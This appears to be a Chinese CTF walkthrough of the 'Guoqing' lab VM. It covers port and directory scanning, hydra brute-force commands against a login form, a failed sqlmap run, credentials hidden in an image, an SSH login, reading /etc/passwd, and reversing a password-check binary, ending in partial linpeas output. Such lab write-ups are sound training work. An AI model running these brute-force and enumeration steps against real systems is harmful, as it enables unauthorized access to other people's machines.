---
title: MazeSec-Guoqing
description: 'QQ Group Virtual Machine'
pubDate: 2026-01-21
image: /image/fengmian/QQ.png
categories:
  - Documentation
tags:
  - MazeSec
  - Linux Machine
---

# 信息收集
## rustscan扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# rustscan -a 192.168.0.101 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.101:22
Open 192.168.0.101:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 192.168.0.101
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-17 05:27 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:27
Completed NSE at 05:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:27
Completed NSE at 05:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:27
Completed NSE at 05:27, 0.00s elapsed
Initiating ARP Ping Scan at 05:27
Scanning 192.168.0.101 [1 port]
Completed ARP Ping Scan at 05:27, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:27
Completed Parallel DNS resolution of 1 host. at 05:27, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 05:27
Scanning 192.168.0.101 [2 ports]
Discovered open port 22/tcp on 192.168.0.101
Discovered open port 80/tcp on 192.168.0.101
Completed SYN Stealth Scan at 05:27, 0.02s elapsed (2 total ports)
Initiating Service scan at 05:27
Scanning 2 services on 192.168.0.101
Completed Service scan at 05:27, 6.03s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.0.101
NSE: Script scanning 192.168.0.101.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:27
Completed NSE at 05:27, 0.36s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:27
Completed NSE at 05:27, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:27
Completed NSE at 05:27, 0.00s elapsed
Nmap scan report for 192.168.0.101
Host is up, received arp-response (0.00041s latency).
Scanned at 2026-01-17 05:27:40 EST for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-title: \xE9\x9D\x9E\xE4\xB8\xBB\xE6\xB5\x81\xE7\x82\xAB\xE9\x85\xB7\xE7\xA9\xBA\xE9\x97\xB4 | \xE6\xAC\xA2\xE8\xBF\x8E\xE5\x85\x89\xE4\xB8\xB4
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:85:7C:03 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/17%OT=22%CT=%CU=39195%PV=Y%DS=1%DC=D%G=N%M=080027
OS:%TM=696B6424%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%II
OS:=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7
OS:%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%
OS:W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
OS:D=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U
OS:1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF
OS:I=N%T=40%CD=S)

Uptime guess: 7.338 days (since Fri Jan  9 21:21:48 2026)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.0.101

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:27
Completed NSE at 05:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:27
Completed NSE at 05:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:27
Completed NSE at 05:27, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
           Raw packets sent: 25 (1.894KB) | Rcvd: 17 (1.366KB)

```

## 80端口
![](/image/qq group/Guoqing-1.png)

我嘞个豆

### 目录扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# gobuster dir -u 192.168.0.101 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js,yaml -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.101
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              yaml,php,txt,html,zip,db,bak,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 9042]
/login.php            (Status: 200) [Size: 2771]
/logout.php           (Status: 302) [Size: 0] [--> login.php]                                                   
/dashboard.php        (Status: 302) [Size: 0] [--> login.php] 
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# dirsearch -u http://192.168.0.101                
/root/.pyenv/versions/3.11.9/envs/web/lib/python3.11/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET
Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.0.101/_26-01-17_05-28-59.txt

Target: http://192.168.0.101/

[05:28:59] Starting: 
[05:29:00] 403 -  278B  - /.ht_wsr.txt
[05:29:00] 403 -  278B  - /.htaccess.bak1
[05:29:00] 403 -  278B  - /.htaccess.orig
[05:29:00] 403 -  278B  - /.htaccess.save
[05:29:00] 403 -  278B  - /.htaccess_extra
[05:29:00] 403 -  278B  - /.htaccess.sample
[05:29:00] 403 -  278B  - /.htaccess_orig
[05:29:00] 403 -  278B  - /.htaccess_sc
[05:29:00] 403 -  278B  - /.htaccessOLD2
[05:29:00] 403 -  278B  - /.htaccessOLD
[05:29:00] 403 -  278B  - /.htaccessBAK
[05:29:00] 403 -  278B  - /.htm
[05:29:00] 403 -  278B  - /.html
[05:29:00] 403 -  278B  - /.htpasswd_test
[05:29:00] 403 -  278B  - /.htpasswds
[05:29:00] 403 -  278B  - /.httr-oauth
[05:29:01] 403 -  278B  - /.php
[05:29:15] 302 -    0B  - /dashboard.php  ->  login.php
[05:29:25] 200 -  937B  - /login.php
[05:29:26] 302 -    0B  - /logout.php  ->  login.php
[05:29:42] 403 -  278B  - /server-status
[05:29:42] 403 -  278B  - /server-status/

Task Completed 
```

### /login.php
![](/image/qq group/Guoqing-2.png)

```plain
POST /login.php HTTP/1.1

Host: 192.168.0.101

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 29

Origin: http://192.168.0.101

Connection: keep-alive

Referer: http://192.168.0.101/login.php

Cookie: PHPSESSID=g7hip4qlponncgkf301noj3mdp

Upgrade-Insecure-Requests: 1

Priority: u=0, i

username=admin&password=admin
```

```plain
HTTP/1.1 200 OK

Date: Sat, 17 Jan 2026 10:33:01 GMT
Server: Apache/2.4.62 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2841
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8



<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>登录系统</title>

</head>
<body>
    <div class="login-container">
        <h2>系统登录</h2>
        
                    <div class="error">用户名或密码错误</div>
                
        <form method="POST" action="login.php">
            <div class="form-group">
                <label for="username">用户名</label>
                <input type="text" id="username" name="username" required autofocus>
            </div>
            
            <div class="form-group">
                <label for="password">密码</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="btn">登录</button>
        </form>
    </div>
</body>
</html>

```

### hydra爆破-失败
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 192.168.0.101 http-post-form "/login.php:username=^USER^&password=^PASS^:用户名或密码错误" 
```

```plain
hydra -l todd -P /usr/share/wordlists/rockyou.txt -f 192.168.0.101 http-post-form "/login.php:username=^USER^&password=^PASS^:用户名或密码错误"
```



### Sqlmap尝试-失败
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# sqlmap -r post --batch  
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.1.47#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:38:26 /2026-01-17/

[05:38:26] [INFO] parsing HTTP request from 'post'
[05:38:26] [INFO] testing connection to the target URL
[05:38:27] [INFO] checking if the target is protected by some kind of WAF/IPS
[05:38:27] [INFO] testing if the target URL content is stable
[05:38:28] [INFO] target URL content is stable
[05:38:28] [INFO] testing if POST parameter 'username' is dynamic
[05:38:28] [WARNING] POST parameter 'username' does not appear to be dynamic
[05:38:28] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[05:38:28] [INFO] testing for SQL injection on POST parameter 'username'
[05:38:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                    
[05:38:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                            
[05:38:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                    
[05:38:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                 
[05:38:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'           
[05:38:28] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                           
[05:38:28] [INFO] testing 'Generic inline queries'
[05:38:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                          
[05:38:28] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                               
[05:38:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                        
[05:38:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                  
[05:38:28] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'                                               
[05:38:28] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'                                   
[05:38:28] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[05:38:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'                                        
[05:38:28] [WARNING] POST parameter 'username' does not seem to be injectable
[05:38:28] [INFO] testing if POST parameter 'password' is dynamic
[05:38:29] [WARNING] POST parameter 'password' does not appear to be dynamic
[05:38:29] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[05:38:29] [INFO] testing for SQL injection on POST parameter 'password'
[05:38:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                    
[05:38:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                            
[05:38:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                    
[05:38:32] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                 
[05:38:33] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'           
[05:38:34] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                           
[05:38:35] [INFO] testing 'Generic inline queries'
[05:38:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                          
[05:38:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                               
[05:38:37] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                        
[05:38:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                  
[05:38:40] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'                                               
[05:38:41] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'                                   
[05:38:42] [INFO] testing 'Oracle AND time-based blind'
[05:38:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'                                        
[05:38:46] [WARNING] POST parameter 'password' does not seem to be injectable
[05:38:46] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 05:38:46 /2026-01-17/
```

### 图片隐写
提取首页的todd图片

![](/image/qq group/Guoqing-3.png)

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# binwalk todd.png  

                                          /home/kali/Desktop/hmv/todd.png
-------------------------------------------------------------------------------------------------------------------
DECIMAL                            HEXADECIMAL                        DESCRIPTION
-------------------------------------------------------------------------------------------------------------------
0                                  0x0                                PNG image, total size: 12928 bytes
-------------------------------------------------------------------------------------------------------------------

Analyzed 1 file for 85 file signatures (187 magic patterns) in 2.0 milliseconds

                                                                                                                   
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# strings todd.png 

....
/T1i
5iMZ
IEND
todd:toddishandsome
```

看到最下面一行todd:toddishandsome

尝试登录获得凭据

admin/toddishandsome

### /dashboard.php
```plain
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>仪表盘</title>
</head>
<body>
    <div class="header">
        <h1>系统仪表盘</h1>
    </div>
    
    <div class="container">
        <div class="welcome">
            欢迎, admin!
        </div>
        
        <div class="card">
            <h3>系统信息</h3>
            <p>您已成功登录系统。这是一个简单的仪表盘页面，用于演示目的。</p>
        </div>
       <!-- 
        <div class="card">
            <a href="hyh" class="hyhforever" target="_blank"></a>
        </div>
        -->
        <div class="card">
            <h3>账户操作</h3>
            <a href="logout.php" class="btn">退出登录</a>
        </div>
    </div>
</body>
</html>

```

发现被注释的一段

```plain
<!-- 
<div class="card">
    <a href="hyh" class="hyhforever" target="_blank"></a>
</div>
-->
```

| 部分 | 含义 |
| --- | --- |
| `href="hyh"` | 非常可疑的路径 |
| `class="hyhforever"` | 明确是“彩蛋/后门”命名 |
| 被注释 | 防止普通用户看到 |


👉 **结论：**`**/hyh**`** 是你下一步要打的点**

**这里fuff了半天没出**

## ssh登录
hyh/hyhforever

```plain
hyh@Guoqing:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
segfault:x:1000:1000:,,,:/home/segfault:/bin/bash
hyh:x:1001:1001:,,,:/home/hyh:/bin/bash
todd:x:1002:1002:,,,:/home/todd:/bin/bash
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
```

# 提权
## segfaultno8
/opt/password

```plain
/opt$ strings password /lib64/ld-linux-x86-64.so.2 mgUa strcpy puts stdin printf fgets strlen strcspn __ctype_b_loc __cxa_finalize strcmp __libc_start_main libc.so.6 GLIBC_2.3 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u/UH gfffH vhjidxowH []A\A]A^A_ Please enter the password for segfault: Incorrect password length. The password should be %d characters long. Please try again: Password correct! Access granted. Incorrect password. Please try again: Too many failed attempts. Access denied. ;*3$" GCC: (Debian 10.2.1-6) 10.2.1 20210110 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.0 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry password.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable strcpy@GLIBC_2.2.5 puts@GLIBC_2.2.5 stdin@GLIBC_2.2.5 _edata strlen@GLIBC_2.2.5 printf@GLIBC_2.2.5 strcspn@GLIBC_2.2.5 __libc_start_main@GLIBC_2.2.5 fgets@GLIBC_2.2.5 __data_start strcmp@GLIBC_2.2.5 __gmon_start__ __dso_handle _IO_stdin_used __libc_csu_init __bss_start main caesar_encrypt __TMC_END__ _ITM_registerTMCloneTable __cxa_finalize@GLIBC_2.2.5 __ctype_b_loc@GLIBC_2.3 .symtab .strtab .shstrtab .interp .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .got.plt .data .bss .comment
```

```plain
scp hyh@192.168.0.101:/opt/password /home/kali/Desktop/hmv/password
```

pwndbg下

```plain
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[64]; // [rsp+0h] [rbp-90h] BYREF
  char s[64]; // [rsp+40h] [rbp-50h] BYREF
  char s2[12]; // [rsp+80h] [rbp-10h] BYREF
  int v7; // [rsp+8Ch] [rbp-4h]

  strcpy(s2, "vhjidxowqr1");
  v7 = 0;
  printf("Please enter the password for segfault: ");
  while ( fgets(s, 50, stdin) )
  {
    s[strcspn(s, "\n")] = 0;
    if ( strlen(s) == 11 )
    {
      strcpy(dest, s);
      caesar_encrypt(dest);
      if ( !strcmp(dest, s2) )
      {
        puts("Password correct! Access granted.");
        return 0;
      }
      printf("Incorrect password. Please try again: ");
      if ( ++v7 > 4 )
      {
        puts("\nToo many failed attempts. Access denied.");
        return 1;
      }
    }
    else
    {
      printf("Incorrect password length. The password should be %d characters long.\n", 11LL);
      printf("Please try again: ");
    }
  }
  return 0;
}
```

拿到凭据

```plain
hyh@Guoqing:/opt$ ./password 
Please enter the password for segfault: ykmlgarz456
Incorrect password. Please try again: segfaultno8
Password correct! Access granted.
```

得到密码segfaultno8

尝试登录没成功

```plain
hyh@Guoqing:/home/segfault$ cat name1.txt 
sublarge
hyh@Guoqing:/home/segfault$ cat name2.txt 
bamuwe
hyh@Guoqing:/home/segfault$ cat name3.txt 
LingMj
```

尝试组合作为密码登录没成功

segfaultno8

```plain
hyh@Guoqing:~$ find / -user segfault -type f 2>/dev/null
/usr/local/bin/irc_bot.py
/home/segfault/.bash_logout
/home/segfault/.bashrc
/home/segfault/.profile
hyh@Guoqing:~$ cat /usr/local/bin/irc_bot.pycat: /usr/local/bin/irc_bot.py: Permission denied
```

```plain
hyh@Guoqing:~$ cat /etc/systemd/system/irc_bot.service
[Unit]
Description=IRC Bot Service
After=network.target

[Service]
User=pycrtlake
Group=pycrtlake
WorkingDirectory=/usr/local/bin
ExecStart=/usr/bin/python3 /usr/local/bin/irc_bot.py
Restart=always
RestartSec=5
StandardOutput=syslog
StandardError=syslog
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
hyh@Guoqing:~$ ls -la /etc/inspircd/
ls: cannot open directory '/etc/inspircd/': Permission denied
hyh@Guoqing:~$ cat /etc/inspircd/*.conf 2>/dev/null
hyh@Guoqing:~$ cat /var/log/inspircd.log
cat: /var/log/inspircd.log: Permission denied
hyh@Guoqing:~$ tail -100 /var/log/inspircd.log
tail: cannot open '/var/log/inspircd.log' for reading: Permission denied
hyh@Guoqing:~$ cat /usr/local/bin/calc-prorate
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from tempora import calculate_prorated_values
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(calculate_prorated_values())
hyh@Guoqing:~$ 
```

```plain
1.weechat│WeeChat 3.0 (C) 2003-2020 - https://weechat.>>
         │07:33:49     |   __ |/ |/ / /  __/  __/ /___
         │             | _  / / / /_/ // /_  
         │07:33:49     |   ____/|__/  \___/\___/\____/
         │             | /_/ /_/\__,_/ \__/  
         │07:33:49     | WeeChat 3.0 [compiled on Jan 23
         │             | 2022 14:29:14]
         │07:33:49     | - - - - - - - - - - - - - - - -
         │             | - - - - - - - - - - - - - - - -
```

没招了

## 本地 IRC 服务 + 可交互 bot
### 1️⃣ nc 根本不存在
```plain
nc: command not found
```

### 2️⃣ inspircd 并未监听任何 IRC 端口
**你之前 **`**ss -lntup**`** 的结果只有：**

```plain
22
80
3306 (127.0.0.1)
```

👉** ****没有 6667 / 6697**

### 3️⃣** weechat 只是你“本地客户端”**
**你现在看到的：**

```plain
WeeChat 3.0
irc: unable to add temporary server
```

**只是你启动了 ****IRC 客户端程序本身****  
**👉** ****不是连上了任何服务器**

### 4️⃣** 你在 bash 里敲的这些：**
```plain
NICK hyh
!auth segfaultno8
```

**全部变成：**

```plain
-bash: command not found
```

**这说明：  
****你从头到尾根本没连进任何 IRC session。**

## linpeas
```plain
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html                                                      
 LEGEND:                                                
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                             
                               ╚═══════════════════╝    
OS: Linux version 4.19.0-27-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.316-1 (2024-06-25)
User & Groups: uid=1001(hyh) gid=1001(hyh) groups=1001(hyh)
Hostname: Guoqing

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)           
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h) 
                                                        

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE  
                                                        
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                              
                              ╚════════════════════╝    
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits               
Linux version 4.19.0-27-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.316-1 (2024-06-25)
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                  
Sudo version 1.9.5p2                                    


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses          
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

╔══════════╣ Date & uptime
Sat 17 Jan 2026 07:44:53 AM EST                         
 07:44:53 up  2:17,  2 users,  load average: 0.00, 0.00, 0.00

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices               
